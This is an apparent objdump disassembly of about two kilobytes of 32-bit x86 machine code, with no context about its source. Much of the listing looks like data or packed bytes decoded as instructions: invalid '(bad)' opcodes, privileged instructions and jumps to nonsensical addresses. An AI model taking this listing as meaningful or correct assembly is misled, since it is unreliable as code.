  4310d5:	(bad)  
  4310d6:	enter  0x4d45,0xb8
  4310da:	mov    edi,DWORD PTR [ecx]
  4310dc:	hlt    
  4310dd:	test   ebx,ecx
  4310df:	pushf  
  4310e0:	enter  0x4df8,0x8b
  4310e4:	mov    DWORD PTR [ebp+0x8],0x894708
  4310eb:	inc    ebp
  4310ec:	mov    ebp,0xff8bfffc
  4310f1:	dec    ebp
  4310f2:	mov    ch,0xf4
  4310f4:	call   DWORD PTR [ebx-0x1]
  4310f7:	mov    ebx,0x8005122
  4310fc:	call   DWORD PTR [ecx+0x8]
  4310ff:	pop    es
  431100:	jmp    0xb8:0x9cb4533
  431107:	cdq    
  431108:	mov    esi,DWORD PTR [edx-0xc]
  43110b:	xor    al,bl
  43110d:	add    BYTE PTR [ecx+0x3c83203],bl
  431113:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  431119:	mov    eax,DWORD PTR [ebx-0xb87b3]
  43111f:	xor    eax,DWORD PTR [eax]
  431121:	retf   
  431122:	ret    
  431123:	add    eax,esi
  431125:	enter  0x8945,0x64
  431129:	dec    ebp
  43112a:	sbb    ah,cl
  43112c:	add    BYTE PTR [ebx-0xb87b277],cl
  431132:	dec    DWORD PTR [ebx-0xbcfb275]
  431138:	test   DWORD PTR [ebx],esi
  43113a:	dec    ebx
  43113c:	inc    DWORD PTR [ebx]
  43113e:	inc    eax
  43113f:	enter  0x8989,0x64
  431143:	(bad)  
  431144:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  431148:	cld    
  431149:	dec    DWORD PTR [ebp-0xa90001]
  43114f:	push   edi
  431150:	mov    BYTE PTR [edx+0x1],ch
  431153:	and    BYTE PTR [eax],al
  431155:	pop    ecx
  431156:	inc    ebp
  431157:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43115d:	push   0xffffff89
  43115f:	pop    ecx
  431160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431161:	dec    ebp
  431162:	add    BYTE PTR [ecx+0x45fc088b],cl
  431168:	jne    0x4311b2
  43116a:	lea    eax,[eax]
  43116c:	fs (bad) 
  43116e:	dec    DWORD PTR [eax]
  431170:	mov    DWORD PTR [eax],eax
  431172:	test   al,0x0
  431174:	add    BYTE PTR [ebp-0x18],cl
  431177:	xor    ebp,DWORD PTR [edx]
  431179:	add    eax,DWORD PTR [eax]
  43117b:	mov    eax,eax
  43117d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431184:	inc    ebp
  431185:	mov    DWORD PTR [ebx+0x459408],ecx
  43118b:	popa   
  43118c:	mov    esp,DWORD PTR [ebp-0x75]
  43118f:	(bad)  
  431190:	cld    
  431191:	inc    eax
  431192:	cmp    bh,0x1
  431195:	lea    eax,[eax]
  431197:	and    BYTE PTR [eax],al
  431199:	inc    DWORD PTR [ecx-0x18]
  43119c:	mov    ecx,DWORD PTR [ebx]
  43119e:	cld    
  43119f:	add    BYTE PTR [ecx+0x75014d],cl
  4311a5:	(bad)  
  4311a6:	xchg   ebp,eax
  4311a7:	sar    bh,1
  4311a9:	inc    eax
  4311aa:	inc    DWORD PTR [eax]
  4311ac:	mov    eax,DWORD PTR [ebp-0x4]
  4311af:	xor    edx,DWORD PTR [edx+0x7201be]
  4311b5:	add    BYTE PTR [edx],dl
  4311b7:	(bad)  
  4311b8:	nop
  4311b9:	inc    ebp
  4311ba:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4311c0:	mov    al,0xff
  4311c2:	add    bh,bh
  4311c4:	add    BYTE PTR [ebx],dh
  4311c6:	inc    DWORD PTR [ebx]
  4311c8:	sbb    al,0x89
  4311ca:	jne    0x4311a8
  4311cc:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4311d2:	mov    eax,DWORD PTR [ebp-0xff0048]
  4311d8:	mov    DWORD PTR [eax-0x70],0xe870e989
  4311df:	inc    DWORD PTR [ebp-0x75]
  4311e2:	(bad)  [esi+ebp*8]
  4311e5:	test   DWORD PTR [esi-0x1],esp
  4311e8:	inc    ebp
  4311e9:	(bad)  
  4311ea:	aas    
  4311eb:	inc    ebp
  4311ec:	(bad)  
  4311ed:	lea    edi,[eax+edi*2-0x1]
  4311f1:	inc    edi
  4311f3:	mov    DWORD PTR [ecx],edi
  4311f5:	mov    al,ds:0x8b8000c7
  4311fa:	call   0x45d0f4fb
  4311ff:	(bad)  
  431200:	out    dx,al
  431201:	(bad)  
  431202:	fisttp WORD PTR [eax+0x8801c7]
  431208:	jecxz  0x43124f
  43120a:	call   0xe83f580e
  43120f:	lea    edi,[edi]
  431211:	(bad)  
  431212:	call   0xcb3d16
  431217:	add    DWORD PTR [ebx-0x7f570400],ecx
  43121d:	add    BYTE PTR [ecx],al
  43121f:	test   DWORD PTR [eax],eax
  431221:	wrmsr  
  431223:	jae    0x431212
  431225:	add    BYTE PTR [eax],al
  431227:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43122d:	add    esp,edi
  43122f:	add    BYTE PTR [eax+0x450108],al
  431235:	mov    edi,DWORD PTR [ebp-0x6c]
  431238:	add    DWORD PTR [eax],0x4
  43123b:	mov    eax,DWORD PTR [ebp+0x3]
  43123e:	mov    edi,DWORD PTR [esp+edi*8]
  431241:	dec    ebp
  431242:	nop
  431243:	mov    eax,DWORD PTR [ecx]
  431245:	fadd   DWORD PTR [eax]
  431247:	add    BYTE PTR [esi],al
  431249:	lea    eax,[eax]
  43124b:	pusha  
  43124c:	push   eax
  43124d:	inc    DWORD PTR [ebp+0x52]
  431250:	call   DWORD PTR [ebp-0x7b]
  431253:	mov    esi,DWORD PTR [ebp-0x74]
  431256:	mov    eax,DWORD PTR [eax]
  431258:	cld    
  431259:	mov    eax,DWORD PTR [eax+0x880103]
  43125f:	add    BYTE PTR [ebp+0x6a],bh
  431262:	cmp    edi,0x10
  431265:	mov    WORD PTR [ebp+0x0],es
  431268:	mov    edx,DWORD PTR [edx-0x4]
  43126b:	push   ecx
  43126c:	nop
  43126d:	inc    DWORD PTR [ecx]
  43126f:	cld    
  431270:	add    BYTE PTR [ebp-0x24],bh
  431273:	mov    eax,DWORD PTR [eax]
  431275:	cld    
  431276:	push   eax
  431277:	nop
  431278:	inc    ebp
  431279:	add    edi,edi
  43127b:	add    BYTE PTR [ebx+0x4de2f445],cl
  431281:	jmp    0xe33b:0x9403c733
  431288:	movntq QWORD PTR [esi],mm6
  43128b:	mov    DWORD PTR [eax],0xb87e8b98
  431291:	test   ebx,eax
  431293:	jmp    DWORD PTR [edi-0x1]
  431296:	int    0xe9
  431298:	sub    esp,esi
  43129a:	add    eax,DWORD PTR [ebp-0x30]
  43129d:	fild   WORD PTR [ebp+0x3f]
  4312a0:	cmp    eax,edi
  4312a2:	je     0xcc43f8c4
  4312a8:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4312af:	(bad)  
  4312b0:	jne    0x43123e
  4312b2:	mov    ebx,ecx
  4312b4:	cld    
  4312b5:	jle    0x4312fc
  4312b7:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  4312bd:	inc    ebp
  4312be:	call   0xeb3c4e
  4312c3:	add    BYTE PTR [ebx-0x7f170301],cl
  4312c9:	add    DWORD PTR es:[eax],eax
  4312cc:	add    al,al
  4312ce:	xor    BYTE PTR [eax+0x41],dl
  4312d1:	inc    ebp
  4312d2:	add    BYTE PTR [ebx+0xfcd88b],cl
  4312d8:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  4312de:	add    DWORD PTR [ecx+0x458be845],ecx
  4312e4:	fmul   DWORD PTR [ebx+0x8bb800]
  4312ea:	cld    
  4312eb:	call   0xd83db0
  4312f0:	dec    DWORD PTR [ebx+0x1090e8ff]
  4312f6:	add    al,al
  4312f8:	push   eax
  4312f9:	es inc ebp
  4312fb:	inc    ebp
  4312fc:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431302:	dec    DWORD PTR [ebx-0x3ff70301]
  431308:	mov    DWORD PTR gs:[eax],eax
  43130b:	call   0x8b6b58d0
  431310:	inc    ebp
  431311:	mov    eax,0xe8d8008b
  431316:	add    BYTE PTR [ecx],ch
  431318:	mov    eax,DWORD PTR [eax]
  43131a:	cld    
  43131b:	mov    eax,eax
  43131d:	call   0x462b2377
  431322:	sub    DWORD PTR [ebx-0x3c743000],ecx
  431328:	cld    
  431329:	mov    BYTE PTR [eax+0x8401c1],0x1
  431330:	xor    BYTE PTR [eax],al
  431332:	push   edi
  431333:	inc    ebp
  431334:	mov    DWORD PTR [ebx],esi
  431336:	in     al,0xb9
  431338:	inc    ebp
  431339:	lea    ecx,[ebx-0x3c370301]
  43133f:	dec    ebp
  431340:	cdq    
  431341:	mov    esi,DWORD PTR [edx]
  431343:	or     BYTE PTR [ebx],al
  431345:	ror    DWORD PTR [ebp-0xfebf79],0x0
  43134c:	call   0x433c96
  431351:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  431357:	jge    0x43138c
  431359:	mov    eax,DWORD PTR [ebx]
  43135b:	cld    
  43135c:	lea    edx,[eax+0xff0120]
  431362:	call   0x433cf6
  431367:	push   eax
  431368:	inc    DWORD PTR [ebp-0x1c]
  43136b:	mov    ecx,DWORD PTR [ebp-0x58]
  43136e:	xor    eax,DWORD PTR [eax]
  431370:	add    edi,edi
  431372:	cmp    ebp,eax
  431374:	jne    0x43139c
  431376:	mov    DWORD PTR [eax],0x8b004dd8
  43137c:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431383:	mov    eax,ebx
  431385:	cld    
  431386:	test   BYTE PTR [eax+0x320199],bh
  43138c:	mov    DWORD PTR [ebp+0x8],esi
  43138f:	xor    eax,DWORD PTR [ebp-0x73]
  431392:	test   DWORD PTR [esp+esi*2-0x1],edi
  431396:	mov    ebp,eax
  431398:	mov    eax,0x33004d29
  43139d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  4313a3:	add    DWORD PTR [eax],eax
  4313a5:	add    BYTE PTR [ebp+0x30],al
  4313a8:	mov    edx,DWORD PTR [edi-0x48]
  4313ab:	add    ebx,0xffffffe4
  4313ae:	addr16 test ebp,ecx
  4313b1:	je     0x4313de
  4313b3:	mov    eax,DWORD PTR [ebx]
  4313b5:	cld    
  4313b6:	sar    BYTE PTR [eax+0x3b0145],1
  4313bc:	pcmpeqw mm4,mm6
  4313bf:	xor    edi,edi
  4313c1:	lea    ecx,[ebx-0x239c7470]
  4313c7:	add    BYTE PTR [ebp+0x50],cl
  4313ca:	cmp    eax,DWORD PTR [ebp+0x75]
  4313cd:	mov    ebp,DWORD PTR [eax-0x68]
  4313d0:	test   DWORD PTR [eax],eax
  4313d2:	clc    
  4313d3:	push   DWORD PTR [ebp-0x1]
  4313d6:	lea    ecx,[eax]
  4313d8:	int3   
  4313d9:	inc    ebp
  4313da:	call   0xfb446a
  4313df:	jne    0x4313d9
  4313e1:	xor    edi,DWORD PTR [ebp-0x41]
  4313e4:	jmp    0x431458
  4313e6:	mov    eax,DWORD PTR [eax]
  4313e8:	mov    eax,0x339545c7
  4313ed:	inc    DWORD PTR [ebx]
  4313ef:	push   DWORD PTR [ecx]
  4313f1:	aaa    
  4313f2:	mov    eax,DWORD PTR [eax]
  4313f4:	jmp    0x431446
  4313f6:	mov    eax,DWORD PTR [ebp-0x3c]
  4313f9:	mov    eax,eax
  4313fb:	cld    
  4313fc:	clc    
  4313fd:	ret    
  4313fe:	test   bh,al
  431400:	pop    es
  431401:	xchg   ebp,eax
  431402:	add    bh,bh
  431404:	inc    ebp
  431405:	dec    DWORD PTR [edi]
  431407:	and    DWORD PTR [ebx],ebp
  431409:	add    BYTE PTR [eax],al
  43140b:	push   eax
  43140c:	jbe    0x431463
  43140e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431414:	or     al,0xcf
  431416:	inc    eax
  431417:	enter  0x745,0x72
  43141b:	inc    ebp
  43141c:	mov    eax,DWORD PTR [ecx]
  43141e:	int3   
  43141f:	add    BYTE PTR [ebp-0x75],al
  431422:	ss mov eax,0x33c74d9c
  431428:	ror    BYTE PTR [ebp+0x72f80885],1
  43142e:	inc    ebp
  43142f:	add    BYTE PTR [ebx-0x3c7423bb],cl
  431435:	fadd   st,st(6)
  431437:	rol    BYTE PTR [ebp+0x12],0x8b
  43143b:	inc    ebp
  43143c:	fmul   QWORD PTR [ebx-0x3c39233d]
  431442:	inc    ebp
  431443:	test   bh,al
  431445:	cdq    
  431446:	clc    
  431447:	xor    al,BYTE PTR [ebp+0x45dcf889]
  43144d:	inc    ebp
  43144e:	cmp    BYTE PTR [ebx],dh
  431450:	pushf  
  431451:	mov    ecx,0xffb48dc7
  431456:	test   eax,ecx
  431458:	clc    
  431459:	dec    ebp
  43145a:	inc    ebp
  43145b:	mov    edi,DWORD PTR [edx]
  43145d:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  431464:	test   edi,edi
  431466:	clc    
  431467:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  43146e:	(bad)  
  43146f:	enter  0x18e8,0x85
  431473:	ss clc 
  431475:	pushf  
  431476:	inc    ebp
  431477:	dec    DWORD PTR [ebx-0x3cba0f04]
  43147d:	push   eax
  43147e:	xabort 0x7d
  431481:	add    BYTE PTR [ebx],bh
  431483:	mov    ecx,DWORD PTR [edi]
  431485:	mov    DWORD PTR [eax],ebx
  431487:	les    eax,FWORD PTR [eax]
  431489:	adc    ebp,ecx
  43148b:	dec    ebp
  43148c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431492:	mov    ecx,esi
  431494:	lock or al,cl
  431497:	clc    
  431498:	inc    ebp
  431499:	add    esi,DWORD PTR [ebx]
  43149b:	jge    0x4314a0
  43149d:	xor    edi,DWORD PTR [ebx]
  43149f:	cmp    ecx,DWORD PTR [edi]
  4314a1:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4314a6:	mov    edi,DWORD PTR [ecx]
  4314a8:	test   al,0xcc
  4314aa:	dec    ebp
  4314ab:	test   BYTE PTR [ebx],dh
  4314ad:	pop    es
  4314ae:	xor    eax,DWORD PTR [eax]
  4314b0:	add    ecx,DWORD PTR [esi]
  4314b2:	add    ecx,eax
  4314b4:	psraw  mm0,mm1
  4314b7:	sub    BYTE PTR [ebp+0x38],cl
  4314ba:	mov    edi,DWORD PTR [ebx]
  4314bc:	lock int3 
  4314be:	shl    edx,1
  4314c0:	rol    BYTE PTR [ebp+0xc],1
  4314c3:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4314ca:	jmp    0x7c1514
  4314cf:	pushf  
  4314d0:	inc    ebp
  4314d1:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4314d7:	xor    ecx,ebx
  4314d9:	add    ecx,esi
  4314db:	mov    esi,eax
  4314dd:	enter  0x45af,0x8b
  4314e1:	xor    ecx,eax
  4314e3:	add    edx,DWORD PTR [ebp-0x77]
  4314e6:	sub    ecx,DWORD PTR [eax]
  4314e8:	cmp    eax,DWORD PTR [ebp+0x77]
  4314eb:	(bad)  
  4314ec:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  4314f3:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  4314f9:	cmp    esi,DWORD PTR [ebx]
  4314fb:	pushf  
  4314fc:	xor    eax,edi
  4314fe:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431505:	inc    ebp
  431506:	dec    ebp
  431507:	cmp    eax,0xc7f09c8b
  43150c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431513:	inc    ebp
  431514:	jmp    0x431555
  431516:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43151d:	dec    ebp
  43151e:	xor    esi,DWORD PTR [ebx]
  431520:	add    eax,DWORD PTR [ebx]
  431522:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  431528:	dec    ebp
  431529:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  43152f:	out    dx,eax
  431530:	rol    BYTE PTR [eax],1
  431532:	add    eax,0xebc8458b
  431537:	dec    ebp
  431538:	mov    ebp,DWORD PTR [ebx]
  43153a:	mov    esp,0x33f84d8b
  43153f:	ret    
  431540:	xor    eax,esi
  431542:	add    ecx,eax
  431544:	add    eax,DWORD PTR [edx+0xc1010f]
  43154a:	dec    ebp
  43154b:	inc    ebp
  43154c:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  431552:	ror    bl,1
  431554:	add    eax,0xebc645ce
  431559:	scas   eax,DWORD PTR es:[edi]
  43155a:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  431560:	xor    ebp,DWORD PTR [ebx]
  431562:	xor    edi,DWORD PTR [ebx]
  431564:	add    esi,DWORD PTR [edi+0x3]
  431567:	mov    ecx,DWORD PTR [edi]
  431569:	clc    
  43156a:	rol    ebx,0x4d
  43156d:	(bad)  
  43156e:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  431575:	mov    ah,0x45
  431577:	dec    ebp
  431578:	jbe    0x4315ad
  43157a:	mov    esi,DWORD PTR [ebx]
  43157c:	call   0x33466284
  431581:	rdpmc  
  431583:	rol    DWORD PTR [ebx],0x4d
  431586:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43158c:	inc    ebp
  43158d:	ror    BYTE PTR [ebx+0x45450808],1
  431593:	jmp    0x10b1623
  431598:	inc    ebp
  431599:	inc    ebp
  43159a:	(bad)  
  43159b:	mov    ebx,eax
  43159d:	clc    
  43159e:	test   ebx,eax
  4315a0:	clc    
  4315a1:	retf   
  4315a2:	inc    ebp
  4315a3:	into   
  4315a4:	mov    esi,0x8b85afec
  4315aa:	clc    
  4315ab:	enter  0x5545,0x38
  4315af:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4315b6:	ret    
  4315b7:	mov    ah,0xc6
  4315b9:	addr16 push 0x338b4545
  4315bf:	clc    
  4315c0:	add    eax,ebx
  4315c2:	loopne 0x43158f
  4315c4:	dec    ebp
  4315c5:	into   
  4315c6:	mov    al,dh
  4315c8:	or     BYTE PTR [edi-0x37ff748e],ch
  4315ce:	inc    ebp
  4315cf:	push   ebp
  4315d0:	mov    ebp,DWORD PTR [ebx]
  4315d2:	in     al,dx
  4315d3:	cmp    eax,ebx
  4315d5:	ja     0x43161c
  4315d7:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4315dd:	inc    ebp
  4315de:	cdq    
  4315df:	mov    esi,DWORD PTR [edx]
  4315e1:	clc    
  4315e2:	mov    bl,al
  4315e4:	xlat   BYTE PTR ds:[ebx]
  4315e5:	retf   
  4315e6:	inc    ebp
  4315e7:	into   
  4315e8:	mov    eax,esi
  4315ea:	in     al,dx
  4315eb:	scas   eax,DWORD PTR es:[edi]
  4315ec:	retf   
  4315ed:	mov    ecx,DWORD PTR [ebp-0x38]
  4315f0:	mov    edx,DWORD PTR [ebp-0x24]
  4315f3:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  4315fa:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431601:	mov    eax,DWORD PTR [ebx]
  431603:	clc    
  431604:	loopne 0x4315c9
  431606:	push   ebp
  431607:	retf   
  431608:	mov    dh,al
  43160a:	adc    esi,ecx
  43160c:	jb     0x4315bd
  43160e:	add    BYTE PTR [ebx+0x558bc845],cl
  431614:	in     al,dx
  431615:	sub    eax,ebx
  431617:	cmp    ecx,ebx
  431619:	mov    eax,esi
  43161b:	mov    esp,0x45af03ce
  431620:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  431626:	mov    eax,ebx
  431628:	in     al,dx
  431629:	into   
  43162a:	dec    ebp
  43162b:	(bad)  
  43162c:	xor    ebp,DWORD PTR [edi+0x80f8903]
  431632:	rol    DWORD PTR [ebp+0x4d],0x89
  431636:	xor    esp,esp
  431638:	sub    eax,DWORD PTR [ebp-0x75]
  43163b:	add    ebp,esp
  43163d:	mov    al,0x55
  43163f:	inc    ebp
  431640:	xor    esi,DWORD PTR [esi]
  431642:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  431649:	inc    ebp
  43164a:	xor    edi,DWORD PTR [ecx]
  43164c:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  431653:	test   DWORD PTR [eax],eax
  431655:	clc    
  431656:	enter  0x8645,0x33
  43165a:	inc    DWORD PTR [ebx]
  43165c:	(bad)  
  43165d:	jmp    0x4316a4
  43165f:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  431665:	inc    ebp
  431666:	(bad)  
  431667:	mov    ebp,DWORD PTR [edi-0x277b7424]
  43166d:	cdq    
  43166e:	retf   
  43166f:	xor    al,cl
  431671:	mov    BYTE PTR [ebp+0xb],cl
  431674:	lea    eax,[ebp+0x8]
  431677:	xor    esi,DWORD PTR [edx+0x3]
  43167a:	add    al,ah
  43167c:	inc    ebp
  43167d:	dec    ebp
  43167e:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431684:	addr16 add ch,cl
  431687:	inc    ebp
  431688:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43168e:	inc    ebp
  43168f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431695:	push   ebp
  431696:	(bad)  
  431697:	mov    BYTE PTR [edi+0xf723b11],ch
  43169d:	add    ch,ch
  43169f:	inc    ebp
  4316a0:	dec    DWORD PTR [ebx-0x34332775]
  4316a6:	add    al,0x4d
  4316a8:	inc    ebp
  4316a9:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4316af:	cdq    
  4316b0:	add    DWORD PTR [edx],esi
  4316b2:	add    BYTE PTR [ebx+0x4d00c000],cl
  4316b8:	push   DWORD PTR [ebx]
  4316ba:	int3   
  4316bb:	xor    eax,DWORD PTR [eax]
  4316bd:	add    edx,DWORD PTR [eax+0x3]
  4316c0:	mov    DWORD PTR [edi],ecx
  4316c2:	call   0x4288d788
  4316c7:	mov    DWORD PTR [ebp-0x20],esp
  4316ca:	add    BYTE PTR [ebp+0x7d],al
  4316cd:	mov    eax,DWORD PTR [eax]
  4316cf:	in     al,0x15
  4316d1:	ret    
  4316d2:	iret   
  4316d3:	(bad)  
  4316d4:	enter  0x14af,0x8b
  4316d8:	(bad)  
  4316d9:	in     al,dx
  4316da:	or     bl,cl
  4316dc:	adc    cl,al
  4316de:	push   ebp
  4316df:	dec    ebp
  4316e0:	inc    eax
  4316e1:	mov    edx,DWORD PTR [ebp-0x20]
  4316e4:	jb     0x4316b1
  4316e6:	mov    ecx,esi
  4316e8:	cld    
  4316e9:	scas   eax,DWORD PTR es:[edi]
  4316ea:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4316f1:	mov    BYTE PTR [eax],0x8c
  4316f4:	push   0xffffff99
  4316f6:	push   edi
  4316f7:	xor    dl,BYTE PTR [eax+0x3b]
  4316fa:	mov    ecx,DWORD PTR [edi]
  4316fc:	call   0x8c425c5f
  431701:	mov    eax,eax
  431703:	in     al,dx
  431704:	jge    0x431753
  431706:	mov    DWORD PTR [ebx],esi
  431708:	int3   
  431709:	add    eax,DWORD PTR [ebp+0xf]
  43170c:	xor    eax,ecx
  43170e:	(bad)  
  43170f:	dec    ebp
  431710:	pushf  
  431711:	xor    ecx,esi
  431713:	add    edi,DWORD PTR [edi]
  431715:	mov    eax,DWORD PTR [ebp-0x38]
  431718:	(bad)  
  431719:	test   dh,dl
  43171b:	cdq    
  43171c:	add    esi,DWORD PTR [edx]
  43171e:	jmp    0x4316a9
  431720:	mov    cl,al
  431722:	add    eax,0x14330f45
  431727:	mov    ecx,0xff448d80
  43172c:	jmp    0xc99026f9
  431731:	mov    edx,ecx
  431733:	rol    BYTE PTR [ebp+0x330155],1
  431739:	add    ecx,DWORD PTR [ebp+0xf]
  43173c:	xor    eax,edx
  43173e:	(bad)  
  43173f:	ror    DWORD PTR [eax],0x86
  431742:	jb     0x431741
  431744:	add    bh,bh
  431746:	clc    
  431747:	inc    ebp
  431748:	jb     0x4317b4
  43174a:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  431750:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  431758:	ret    
  431759:	xor    al,bh
  43175b:	add    BYTE PTR [ebp+0x75],al
  43175e:	ss push 0xffffff9c
  431761:	inc    edi
  431763:	adc    al,0xe8
  431765:	inc    ebp
  431766:	test   DWORD PTR [ebp-0x7cba8b08],eax
  43176c:	mov    ecx,DWORD PTR [eax]
  43176e:	cld    
  43176f:	or     DWORD PTR [ebp-0x34],0x33
  431773:	jbe    0x431778
  431775:	mov    edx,DWORD PTR [ecx+0x2b]
  431778:	dec    ebp
  431779:	mov    cl,BYTE PTR [ebx+0x45d801]
  43177f:	mov    BYTE PTR [ebx],dh
  431781:	mov    eax,DWORD PTR [ebx]
  431783:	or     BYTE PTR [ecx+0x3b],dl
  431786:	dec    ebp
  431787:	int3   
  431788:	xor    ebp,edi
  43178a:	add    eax,DWORD PTR [ebp+0x51]
  43178d:	mov    ecx,DWORD PTR [ebp-0x28]
  431790:	xor    eax,DWORD PTR [eax]
  431792:	add    ebp,DWORD PTR [eax+0x51]
  431795:	adc    BYTE PTR [eax+0x0],0x8b
  431799:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43179f:	inc    ebp
  4317a0:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4317a6:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4317ac:	dec    ebp
  4317ad:	mov    esi,DWORD PTR [ebx]
  4317af:	hlt    
  4317b0:	add    eax,ebx
  4317b2:	push   ecx
  4317b3:	inc    ebp
  4317b4:	dec    ebp
  4317b5:	(bad)  
  4317b6:	call   esi
  4317b8:	in     al,0xc7
  4317ba:	retf   
  4317bb:	mov    al,ds:0xc1ff39ce
  4317c0:	adc    al,0xc6
  4317c2:	inc    ebp
  4317c3:	and    eax,0x9c0f4c85
  4317c8:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4317cf:	cmp    BYTE PTR [ebx+0x3a],0x0
  4317d3:	mov    dh,0xc7
  4317d5:	cmp    eax,eax
  4317d7:	jne    0x45441023
  4317dd:	mov    edi,DWORD PTR [eax]
  4317df:	mov    eax,0x848bcb9c
  4317e4:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  4317eb:	or     BYTE PTR [edi],cl
  4317ed:	(bad)  
  4317ee:	dec    ebp
  4317ef:	inc    edi
  4317f0:	add    bh,0x51
  4317f3:	or     cl,ch
  4317f5:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4317fb:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431801:	mov    esp,0xf802b588
  431806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431807:	inc    ebp
  431808:	(bad)  
  431809:	cmp    bh,bh
  43180b:	pushf  
  43180c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431813:	mov    ecx,DWORD PTR [ebp-0x340018]
  431819:	into   
  43181a:	dec    DWORD PTR [ebx-0x7f72431c]
  431820:	push   0x5000ff01
  431825:	retf   
  431826:	inc    ebp
  431827:	into   
  431828:	dec    DWORD PTR [ebx-0x343f3ff4]
  43182e:	push   eax
  43182f:	into   
  431830:	call   0x4b1cc0
  431835:	retf   
  431836:	add    dh,cl
  431838:	add    bh,bh
  43183a:	mov    DWORD PTR [eax+ecx*1],edx
  43183d:	clc    
  43183e:	inc    ebp
  43183f:	inc    ebp
  431840:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  431846:	push   0x1
  431848:	push   edi
  431849:	add    BYTE PTR [eax-0x35],dl
  43184c:	mov    ecx,esi
  43184e:	cld    
  43184f:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  431855:	into   
  431856:	ror    BYTE PTR [ebx+0x75000800],0x50
  43185d:	xor    eax,DWORD PTR [ebp+0x3]
  431860:	jne    0x4318b3
  431862:	call   DWORD PTR [eax-0x3c]
  431865:	mov    DWORD PTR [ecx-0x18],edx
  431868:	mov    edi,edi
  43186a:	call   0x8b465df3
  43186f:	add    ah,ah
  431871:	rol    BYTE PTR [ebp-0x7c],0xeb
  431875:	add    edi,edi
  431877:	add    al,ch
  431879:	inc    ebp
  43187a:	push   ecx
  43187b:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431881:	mov    al,0xc7
  431883:	test   esp,esp
  431885:	clc    
  431886:	test   DWORD PTR [ebp-0x8],ecx
  431889:	add    BYTE PTR [ebp+0x51],0x39
  43188d:	jmp    0x8bcca12e
  431892:	in     al,dx
  431893:	or     BYTE PTR [ebp-0xf],al
  431896:	xor    eax,DWORD PTR [eax+0x4f896703]
  43189c:	hlt    
  43189d:	mov    eax,DWORD PTR [ebp-0x50]
  4318a0:	xor    esi,ecx
  4318a2:	add    eax,DWORD PTR [eax+0x4f086789]
  4318a8:	inc    ebp
  4318a9:	adc    esi,0x68
  4318ac:	pushf  
  4318ad:	inc    edi
  4318af:	add    al,ch
  4318b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4318b2:	test   edi,edi
  4318b4:	clc    
  4318b5:	inc    DWORD PTR [ebp-0x73]
  4318b8:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  4318bc:	(bad)  
  4318bd:	push   ecx
  4318be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4318bf:	jne    0x431846
  4318c1:	push   eax
  4318c2:	clc    
  4318c3:	test   DWORD PTR [ebp-0x1],eax
  4318c6:	cmp    eax,0xc78b9cff
  4318cb:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4318d2:	inc    ebp
  4318d3:	push   edi
  4318d4:	aas    
  4318d5:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  4318dc:	dec    ebp
  4318dd:	add    BYTE PTR [ebx],dh
  4318df:	inc    ebp
